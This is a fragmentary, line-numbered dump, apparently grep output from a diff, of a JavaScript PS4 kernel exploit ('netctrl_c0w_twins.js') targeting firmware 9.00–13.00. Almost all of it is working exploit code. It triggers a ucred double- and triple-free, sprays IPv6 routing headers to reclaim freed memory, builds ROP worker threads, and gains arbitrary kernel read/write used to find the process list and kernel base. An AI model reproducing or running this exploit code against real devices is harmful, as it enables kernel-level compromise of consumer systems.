+724:    if (spray_ipv6_worker !== undefined) {
+725:        //close(spray_ipv6_worker.pipe_0);
+726:        //close(spray_ipv6_worker.pipe_1);
+761:        // Trigger worker to fill ipv6 sockets
+762:        trigger_ipv6_spray_and_read();
+764:        wait_ipv6_spray_and_read();
+766:        for (i = 0; i < IPV6_SOCK_NUM; i++) {
+770:            // I got 'i' socket routing header but find 'j' value
+800:        for (i = 0; i < ipv6_socks.length; i++) {
+802:            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+805:        for (i = 0; i < ipv6_socks.length; i++) {
+806:            get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+811:            // I got 'i' socket routing header but find 'j' value
+848:        for (i = 0; i < ipv6_socks.length; i++) {
+854:            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+857:            //set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+860:        //for (i = 0; i < ipv6_socks.length; i++) {
+864:        get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+901:    trigger_ucred_triplefree();
+907:    const fd_files = kreadslow64(kq_fdp);
+911:    const masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+914:    const victimRpipeFile = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+917:    const masterRpipeData = kreadslow64(masterRpipeFile.add(0x00));
+920:    const victimRpipeData = kreadslow64(victimRpipeFile.add(0x00));
+930:    kwriteslow(masterRpipeData, masterPipebuf, PIPEBUF_SIZE);
+932:    const read_check = kreadslow64(masterRpipeData);
+938:function trigger_ucred_triplefree() {
+950:        var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+952:        // Register dummy socket.
+953:        write32(set_buf, dummy_socket&0xFFFFFFFF);
+956:        // Close the dummy socket.
+957:        close(dummy_socket);
+959:        // Allocate a new ucred.
+963:        uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+965:        // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
+968:        // Unregister dummy socket and free the file and ucred.
+969:        write32(clear_buf, uaf_socket);
+983:        // Double free ucred.
+985:        close(dup(uaf_socket));
+995:            close(uaf_socket);
+1003:        get_rthdr(ipv6_socks[twins[0]], leak_0, 8);
+1004:        get_rthdr(ipv6_socks[twins[1]], leak_1, 8);
+1012:        free_rthdr(ipv6_socks[twins[1]]);
+1022:            get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
+1038:            close(uaf_socket);
+1045:        // Triple free ucred.
+1046:        close(dup(uaf_socket));
+1058:            close(uaf_socket);
+1076:            close(uaf_socket);
+1087:        get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
+1088:        get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
+1089:        get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
+1105:    free_rthdr(ipv6_socks[triplets[1]]);
+1118:        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
+1127:    // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset
+1150:function kreadslow64(address) {
+1151:    var buffer = kreadslow(address, 8);
+1152:    debug("Buffer from kreadslow: " + hex(buffer));
+1159:    write64(uio.add(0x10), BigInt_Error);   // uio_offset
+1168:function kreadslow(addr, size) {
+1170:    debug("Enter kreadslow addr: " + hex(addr) + " size : " + size);
+1181:    setsockopt(uio_sock_1, SOL_SOCKET, SO_SNDBUF, buf_size, 4);
+1190:    free_rthdr(ipv6_socks[triplets[1]]);
+1201:        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+1228:    free_rthdr(ipv6_socks[triplets[2]]);
+1240:        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+1289:    get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
+1290:    get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
+1291:    get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
+1304:function kwriteslow(addr, buffer, size) {
+1306:    debug("Enter kwriteslow addr: " + hex(addr) + " buffer: " + hex(buffer) + " size : " + size);
+1311:    setsockopt(uio_sock_1, SOL_SOCKET, SO_SNDBUF, buf_size, 4);
+1317:    free_rthdr(ipv6_socks[triplets[1]]);
+1325:        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+1347:    free_rthdr(ipv6_socks[triplets[2]]);
+1356:        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+1709:function ipv6_sock_spray_and_read_rop (ready_signal, run_fd, done_signal, signal_buf) {
+1761:    // Spray all sockets
+1762:    for (var i = 0; i < ipv6_socks.length; i++) {
+1764:        rop.push(ipv6_socks[i]);
+1766:        rop.push(IPPROTO_IPV6);
+1768:        rop.push(IPV6_RTHDR);
+1770:        rop.push(spray_rthdr_rop.add(i*UCRED_SIZE)) // Offset for socket i
+1773:        //debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));
+1780:    // After spraying, read all sockets into buffer array
+1781:    for (var i = 0; i < ipv6_socks.length; i++) {
+1783:        rop.push(ipv6_socks[i]);
+1785:        //debug("pushed sock: " + hex(ipv6_socks[i]));
+1787:        rop.push(IPPROTO_IPV6);
+1789:        rop.push(IPV6_RTHDR);
+1791:        rop.push(read_rthdr_rop.add(i * 8));  // Offset for socket i
+1822:function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal, signal_buf, master, other) {
+1874:    // Spray all sockets
+1875:    for (var i = 0; i < ipv6_socks.length; i++) {
+1877:        // Don't spray on socket master or other
+1883:        rop.push(ipv6_socks[i]);
+1885:        rop.push(IPPROTO_IPV6);
+1887:        rop.push(IPV6_RTHDR);
+1889:        rop.push(spray_rthdr_rop.add(i*UCRED_SIZE)) // Offset for socket i
+===== netctrl_c0w_twins.js =====
+452fd2ae1c29d05f61bb9c02c3e4f131b07825da903bb119f79510bb53656bb2  /tmp/netctrl-ref/netctrl_c0w_twins.js
+ 2420 75818 /tmp/netctrl-ref/netctrl_c0w_twins.js
+2:include('kernel.js')
+76:var socket              = fn.register(0x61,  'socket',             'bigint');
+77:var socketpair          = fn.register(0x87,  'socketpair',         'bigint');
+122:KERNEL_PID = 0;
+136:IPPROTO_IPV6 = 41;
+139:SOL_SOCKET = 0xffff;
+141:IPV6_RTHDR = 51;
+142:IPV6_RTHDR_TYPE_0 = 0;
+159:UCRED_SIZE = 0x168;
+167:IPV6_SOCK_NUM = 96;
+193:FW_VERSION = ""; // Needs to be initialized to patch kernel
+201:var ipv6_socks = new Array(IPV6_SOCK_NUM);
+203:var spray_rthdr = malloc(UCRED_SIZE);
+205:var leak_rthdr = malloc(UCRED_SIZE);
+208:// Allocate buffer for ipv6_sockets magic spray
+209:var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
+210:// Allocate buffer array for all socket data (X sockets × 8 bytes each)
+211:var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
+248:var spray_ipv6_ready = malloc(8);
+249:var spray_ipv6_done = malloc(8);
+250:var spray_ipv6_signal_buf = malloc(8);
+251:var spray_ipv6_stack = malloc(0x2000);
+254:var spray_ipv6_triplet_ready = malloc(8);
+255:var spray_ipv6_triplet_done = malloc(8);
+256:var spray_ipv6_triplet_signal_buf = malloc(8);
+257:var spray_ipv6_triplet_stack = malloc(0x22000);
+258:var store_socket_skip_0 = malloc(8);
+259:var store_socket_skip_1 = malloc(8);
+264:var spray_ipv6_worker;
+265:var spray_ipv6_triplet_worker;
+267:var uaf_socket;
+299:        write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);   // ip6r_type
+329:    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+336:    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+345:            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+351:    set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+403:        // Socket pair to signal "run"
+404:        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+429:        // Socket pair to signal "run"
+430:        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+455:        // Socket pair to signal "run"
+456:        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+473:    // Create worker for spray and read magic in ipv6_sockets
+477:    var ready = spray_ipv6_ready;
+478:    var done = spray_ipv6_done;
+479:    var signal_buf = spray_ipv6_signal_buf;
+481:    // Socket pair to signal "run"
+482:    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+486:    var ret = ipv6_sock_spray_and_read_rop(ready, pipe_0, done, signal_buf);
+496:    spray_ipv6_worker = worker;         // --> Worker data
+501:    ready = spray_ipv6_triplet_ready;
+502:    done = spray_ipv6_triplet_done;
+503:    signal_buf = spray_ipv6_triplet_signal_buf;
+505:    // Socket pair to signal "run"
+506:    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+510:    ret = ipv6_sock_spray_triplet_rop(ready, pipe_0, done, signal_buf);
+521:    spray_ipv6_triplet_worker = worker;         // --> Worker data
+562:    worker = spray_ipv6_triplet_worker;
+563:    ret = spawn_thread(worker.rop, worker.loop_size, spray_ipv6_triplet_stack);
+565:        throw new Error("Could not spawn spray_ipv6_triplet_worker");
+568:    spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
+586:    worker = spray_ipv6_triplet_worker;
+590:    var ret = spawn_thread(worker.rop, worker.loop_size, spray_ipv6_triplet_stack, true);
+593:        throw new Error("Could not spawn spray_ipv6_triplet_worker");
+596:    spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
+601:        throw new Error("Could not signal 'run' spray_ipv6_triplet_worker");
+607:    wait_for(spray_ipv6_triplet_worker.done, 1)
+640:function trigger_ipv6_spray_and_read() {
+645:    write64(spray_ipv6_worker.done, 0);
+647:    // Spawn ipv6_sockets spray and read worker
+649:    //debug("Im calling spawn_thread for spray_ipv6_worker");
+650:    ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack); 
+652:        throw new Error("Could not spray_ipv6_worker");
+655:    spray_ipv6_worker.thread_id = thread_id;        // Save thread ID
+658:    ret = write(spray_ipv6_worker.pipe_1, spray_ipv6_worker.signal_buf, 1); 
+660:        throw new Error("Could not signal 'run' spray_ipv6_worker");
+664:function wait_ipv6_spray_and_read() {
+666:    wait_for(spray_ipv6_worker.done, 1)
+741:    if (compare_version(FW_VERSION, "9.00") < 0 || compare_version(FW_VERSION, "13.00") > 0) {
+742:        debug("Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...");
+747:    kernel_offset = get_kernel_offset(FW_VERSION);
+748:    debug("Kernel offsets loaded for FW " + FW_VERSION);
+763:    spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
+766:    // Fill spray_rthdr_rop for ipv6_sockets spray
+767:    for(i=0; i<IPV6_SOCK_NUM; i++) {
+768:        build_rthdr(spray_rthdr_rop.add(i*UCRED_SIZE), UCRED_SIZE);
+770:        write32(spray_rthdr_rop.add(i*UCRED_SIZE+0x04), RTHDR_TAG | i);
+783:    // Create socket pair for uio spraying.
+784:    socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
+788:    // Create socket pair for iov spraying.
+789:    socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
+793:    // Set up sockets for spraying.
+794:    for (var i = 0; i < ipv6_socks.length; i++) {
+795:      ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+799:    free_rthdrs(ipv6_socks);
+801:    // Create pipes for arbitrary kernel r/w
+828:    write64(store_socket_skip_0, 0xFFFF);
+829:    write64(store_socket_skip_1, 0xFFFF);
+840:    for (var i = 0; i < ipv6_socks.length; i++) {
+841:        close(ipv6_socks[i]);
+849:    if (uaf_socket !== undefined) {
+850:        close(uaf_socket);
+886:    if (spray_ipv6_worker !== undefined) {
+887:        close(spray_ipv6_worker.pipe_0);
+888:        close(spray_ipv6_worker.pipe_1);
+923:        // Trigger worker to fill ipv6 sockets
+924:        trigger_ipv6_spray_and_read();
+926:        wait_ipv6_spray_and_read();
+928:        for (i = 0; i < IPV6_SOCK_NUM; i++) {
+932:            // I got 'i' socket routing header but find 'j' value
+962:        for (i = 0; i < ipv6_socks.length; i++) {
+964:            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+967:            //set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+968:            //setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+970:        for (i = 0; i < ipv6_socks.length; i++) {
+971:            get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+974:            // I got 'i' socket routing header but find 'j' value
+992:    // Fill stores with sockets to skip
+993:    write64(store_socket_skip_0, master);
+994:    write64(store_socket_skip_1, other);
+1015:        get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+1047:        for (i = 0; i < ipv6_socks.length; i++) {
+1053:            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+1056:            //set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+1057:            //setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+1060:        //for (i = 0; i < ipv6_socks.length; i++) {
+1064:        get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+1104:        if(!trigger_ucred_triplefree()) {
+1112:        debug("Failed to adquiere slow kernel R/W");
+1130:    const fd_files = kreadslow64(kq_fdp);
+1134:    master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+1137:    victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+1140:    master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
+1143:    victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));
+1154:    var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
+1168:    remove_rthr_from_socket(ipv6_socks[triplets[0]]);
+1169:    remove_rthr_from_socket(ipv6_socks[triplets[1]]);
+1175:        var readed = kread64(master_r_pipe_data.add(i));
+1181:    debug("Reading value in victim_r_pipe_file: " + hex(kread64(victim_r_pipe_file)) );
+1195:    f_data = kread64(fp.add(0x00));
+1196:    pipe_sigio = kread64(f_data.add(0xd0));
+1197:    p = kread64(pipe_sigio);
+1198:    kernel.addr.curproc = p; // Set global curproc
+1201:        p = kread64(p.add(0x08)); // p_list.le_prev
+1212:    kernel.addr.allproc = find_allproc(); // Set global allproc
+1213:    debug("allproc: " + hex(kernel.addr.allproc));
+1215:    // Calculate kernel base
+1216:    kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
+1217:    debug("Kernel base: " + hex(kernel.addr.base));
+1226:    kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1); // f_count
+1230:    return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
+1233:function remove_rthr_from_socket(fd) {
+1234:    // In case last triplet was not found in kwriteslow
+1238:        f_data = kread64(fp.add(0x00));
+1239:        so_pcb = kread64(f_data.add(0x18));
+1240:        in6p_outputopts = kread64(so_pcb.add(0x118));
+1241:        kwrite64(in6p_outputopts.add(0x68), 0); // ip6po_rhi_rthdr
+1272:function kwrite(dest, src, n) {
+1277:function kread(dest, src, n) {
+1278:    debug("Enter kread for src: " + hex(src));
+1284:        //debug("kread_read: " + hex(readed) );
+1289:function kwrite64(addr, val) {
+1291:    kwrite(addr, tmp, 8);
+1294:function kwrite32(addr, val) {
+1296:    kwrite(addr, tmp, 4);
+1299:function kread64(addr) {
+1300:    kread(tmp, addr, 8);
+1304:function kread32(addr) {
+1305:    kread(tmp, addr, 4);
+1323:// Functions used in global kernel.js
+1325:kernel.read_buffer = function(kaddr, len) {
+1326:    kread(tmp, kaddr, len);
+1330:kernel.write_buffer = function(kaddr, buf) {
+1332:    kwrite(kaddr, tmp, buf.length);
+1336:    uafFile = fget(uaf_socket);
+1337:    kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), 0);
+1340:        s = socket(AF_UNIX, SOCK_STREAM, 0);
+1342:            kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), 0);
+1353:function trigger_ucred_triplefree() {
+1367:        var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
